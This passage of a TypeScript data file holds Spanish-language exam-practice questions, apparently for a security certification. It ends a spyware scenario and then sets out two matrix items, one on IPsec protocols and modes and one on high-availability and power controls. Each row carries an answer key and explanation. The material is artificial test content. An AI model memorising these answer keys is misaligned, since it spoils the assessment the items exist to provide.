            prompt: 'Una aplicación de "linterna" para el móvil enviaba en segundo plano los contactos, la ubicación y el historial de navegación a un servidor externo.',
            evidence: 'Permisos: contactos, ubicación, almacenamiento · tráfico a analytics-collect.example.net',
            answers: { type: 'spyware', fix: 'remove_app_creds' },
            explanation: 'Recolectar información del usuario sin su conocimiento es spyware. Se quita la aplicación y se cambian las contraseñas de las cuentas que pudieron quedar expuestas.',
          },
        ],
      },
    ],
  },
};

// ---------------------------------------------------------------------------
// PBQ 95 — IPsec: AH vs ESP, tunnel vs transport, IKE (3.2, 1.4)
// ---------------------------------------------------------------------------
const IPSEC_PROTOCOL = [
  o('ah', 'AH (Authentication Header)'),
  o('esp', 'ESP (Encapsulating Security Payload)'),
];
const IPSEC_MODE = [
  o('tunnel', 'Modo túnel'),
  o('transport', 'Modo transporte'),
];
const IPSEC_FACTS = [
  o('ike', 'IKE'),
  o('sa', 'Asociación de seguridad (SA)'),
  o('ah', 'AH'),
  o('esp', 'ESP'),
  o('tunnel', 'Modo túnel'),
  o('transport', 'Modo transporte'),
];

const PBQ95: MatrixPbqDefinition = {
  item: item(
    95,
    'cryptography-vpn',
    'VPN e IPsec',
    'IPsec: AH vs ESP y Modo Túnel vs Modo Transporte',
    ['3.2', ['1.4']],
    4,
    'El equipo de redes configura IPsec para distintos enlaces. Para cada uno, elige el protocolo (AH o ESP) y el modo (túnel o transporte) que cumplen el requisito.',
    ['Sección 1: protocolo y modo de cada enlace.', 'Sección 2: identifica el componente de IPsec que describe cada frase.'],
    'AH = integridad y autenticación, SIN cifrado (y falla con NAT). ESP = cifrado, además de integridad. Túnel = cifra el paquete IP completo y le pone una cabecera nueva: es el de los VPN entre sitios (gateway a gateway). Transporte = protege solo la carga útil y deja la cabecera original: es el de host a host dentro de la red.'
  ),
  config: {
    pbqId: 'pbq-95',
    consoleTitle: 'Configuración de Enlaces IPsec (Objetivo 3.2)',
    instructions: 'Elige el protocolo y el modo de cada enlace; en la sección 2, el componente que describe cada frase.',
    sections: [
      {
        id: 's1',
        title: 'Enlaces',
        columns: [
          { id: 'proto', label: 'Protocolo', options: IPSEC_PROTOCOL },
          { id: 'mode', label: 'Modo', options: IPSEC_MODE },
        ],
        rows: [
          {
            id: 'p1',
            prompt: 'VPN entre los firewalls de la casa central y una sucursal a través de Internet: todo el tráfico, incluidas las direcciones internas, debe ir cifrado.',
            answers: { proto: 'esp', mode: 'tunnel' },
            explanation: 'Gateway a gateway por Internet = modo túnel (cifra el paquete completo y oculta las IP internas). Confidencialidad = ESP.',
          },
          {
            id: 'p2',
            prompt: 'Dos servidores de la misma red interna replican una base de datos y el contenido debe ir cifrado; las direcciones originales pueden quedar visibles.',
            answers: { proto: 'esp', mode: 'transport' },
            explanation: 'Host a host = modo transporte (protege la carga útil y conserva la cabecera). Cifrado = ESP.',
          },
          {
            id: 'p3',
            prompt: 'Entre dos equipos de la red de control, la normativa exige probar el origen y la integridad de cada paquete, pero prohíbe cifrar para que el IDS pueda inspeccionar el contenido.',
            answers: { proto: 'ah', mode: 'transport' },
            explanation: 'Integridad y autenticación sin cifrado = AH; host a host = transporte. Trampa: ESP cifraría el contenido y el IDS no podría leerlo.',
          },
          {
            id: 'p4',
            prompt: 'Un empleado remoto se conecta al concentrador VPN de la empresa y necesita acceder cifrado a toda la red interna.',
            answers: { proto: 'esp', mode: 'tunnel' },
            explanation: 'Acceso remoto a una red completa a través de un gateway = modo túnel con ESP para el cifrado.',
          },
        ],
      },
      {
        id: 's2',
        title: 'Componentes',
        columns: [{ id: 'fact', label: 'Componente', options: IPSEC_FACTS }],
        rows: [
          { id: 'c1', prompt: 'Protocolo que negocia las claves y los parámetros de seguridad antes de proteger el tráfico (UDP 500).', answers: { fact: 'ike' }, explanation: 'IKE (Internet Key Exchange) negocia las claves y crea las asociaciones de seguridad; usa UDP 500 (y 4500 con NAT-T).' },
          { id: 'c2', prompt: 'Acuerdo unidireccional entre dos extremos que fija los algoritmos y las claves de un flujo protegido.', answers: { fact: 'sa' }, explanation: 'Cada asociación de seguridad (SA) es de un solo sentido; un túnel bidireccional usa al menos dos.' },
          { id: 'c3', prompt: 'Aporta integridad y autenticación del origen, pero no confidencialidad.', answers: { fact: 'ah' }, explanation: 'AH no cifra. Por eso casi siempre se usa ESP, que puede hacer las dos cosas.' },
          { id: 'c4', prompt: 'Aporta confidencialidad mediante cifrado, además de integridad.', answers: { fact: 'esp' }, explanation: 'ESP cifra la carga útil (y el paquete completo en modo túnel).' },
          { id: 'c5', prompt: 'Encapsula el paquete original completo dentro de uno nuevo con otra cabecera IP.', answers: { fact: 'tunnel' }, explanation: 'Eso es el modo túnel: el paquete interno, con sus direcciones, queda oculto.' },
        ],
      },
    ],
  },
};

// ---------------------------------------------------------------------------
// PBQ 96 — High availability and power (3.4)
// ---------------------------------------------------------------------------
const HA_OPTIONS = [
  o('ups', 'UPS (sistema de alimentación ininterrumpida)'),
  o('generator', 'Generador'),
  o('dual_psu', 'Fuentes de alimentación redundantes'),
  o('load_balancing', 'Balanceo de carga'),
  o('clustering', 'Clustering'),
  o('platform_diversity', 'Diversidad de plataformas'),
  o('multicloud', 'Multinube'),
  o('geo_dispersion', 'Dispersión geográfica'),
  o('coop', 'Continuidad de operaciones (COOP)'),
];

const PBQ96: MatrixPbqDefinition = {
  item: item(
    96,
    'disaster-recovery',
    'Resiliencia',
    'Alta Disponibilidad y Energía: UPS, Generador, Balanceo y Clustering',
    ['3.4', ['3.1']],
    4,
    'El comité de continuidad revisa los riesgos de disponibilidad de la empresa. Elige el control de alta disponibilidad o de energía que resuelve cada caso.',
    ['Elige el control que corresponde a cada caso.', 'Algunas opciones pueden no usarse.'],
    'UPS = cubre el corte de segundos o minutos y da tiempo para un apagado ordenado o para que arranque el generador. Generador = cortes largos (horas). Balanceo de carga = reparte peticiones entre servidores activos; clustering = varios nodos que actúan como uno y se cubren si uno cae. Diversidad de plataformas y multinube = no depender de un solo fabricante o proveedor.'
  ),
  config: {
    pbqId: 'pbq-96',
    consoleTitle: 'Revisión de Alta Disponibilidad (Objetivo 3.4)',
    instructions: 'Elige el control de cada caso.',
    sections: [
      {
        id: 's1',
        title: 'Casos',
        columns: [{ id: 'ha', label: 'Control', options: HA_OPTIONS }],
        rows: [
          { id: 'h1', prompt: 'Un microcorte de 3 segundos reinicia los switches del centro de datos.', answers: { ha: 'ups' }, explanation: 'La UPS entrega energía al instante y cubre cortes breves. Trampa: el generador tarda en arrancar y no evita el reinicio.' },
          { id: 'h2', prompt: 'Tras una tormenta, la zona puede quedarse sin electricidad durante dos días y el hospital debe seguir funcionando.', answers: { ha: 'generator' }, explanation: 'Para cortes de horas o días se necesita un generador; la UPS solo cubre el puente hasta que arranque.' },
          { id: 'h3', prompt: 'Un servidor se apaga cuando falla su única fuente de alimentación, aunque el rack tiene dos circuitos eléctricos.', answers: { ha: 'dual_psu' }, explanation: 'Fuentes redundantes, cada una en un circuito distinto, evitan ese punto único de fallo.' },
          { id: 'h4', prompt: 'La tienda online recibe picos de tráfico y las peticiones deben repartirse entre seis servidores web activos.', answers: { ha: 'load_balancing' }, explanation: 'Repartir peticiones entre servidores activos es balanceo de carga.' },
          { id: 'h5', prompt: 'La base de datos corre en dos nodos que comparten almacenamiento; si el activo falla, el otro toma su lugar con la misma identidad.', answers: { ha: 'clustering' }, explanation: 'Nodos que funcionan como un único sistema y se cubren entre sí forman un cluster. Trampa: el balanceo reparte carga, no comparte estado.' },
          { id: 'h6', prompt: 'Una vulnerabilidad de un solo fabricante dejó fuera de servicio a todos los firewalls a la vez; ahora se combinan dos marcas.', answers: { ha: 'platform_diversity' }, explanation: 'Usar tecnologías de distintos fabricantes evita que una sola falla las afecte a todas: diversidad de plataformas.' },
          { id: 'h7', prompt: 'La caída de una región de un proveedor de nube dejó sin servicio a la empresa; la aplicación se desplegará también en otro proveedor.', answers: { ha: 'multicloud' }, explanation: 'Repartir la carga entre varios proveedores de nube es multinube.' },
          { id: 'h8', prompt: 'Los dos centros de datos están en el mismo edificio; se decide mover uno a otra ciudad para que un desastre local no afecte a ambos.', answers: { ha: 'geo_dispersion' }, explanation: 'Separar los sitios por distancia es dispersión geográfica.' },
          { id: 'h9', prompt: 'Plan que define cómo seguirá prestando sus funciones esenciales la organización durante y después de una interrupción grave.', answers: { ha: 'coop' }, explanation: 'Eso es la planificación de continuidad de operaciones (COOP).' },
        ],
      },
    ],
  },
};

export const MATRIX_PBQS: MatrixPbqDefinition[] = [PBQ51, PBQ52, PBQ53, PBQ54, PBQ55, PBQ56, PBQ57, PBQ58, PBQ59, PBQ61, PBQ65, PBQ66, PBQ67, PBQ68, PBQ69, PBQ70, PBQ71, PBQ72, PBQ73, PBQ74, PBQ75, PBQ92, PBQ93, PBQ94, PBQ95, PBQ96, ...REVIEW_PBQS];
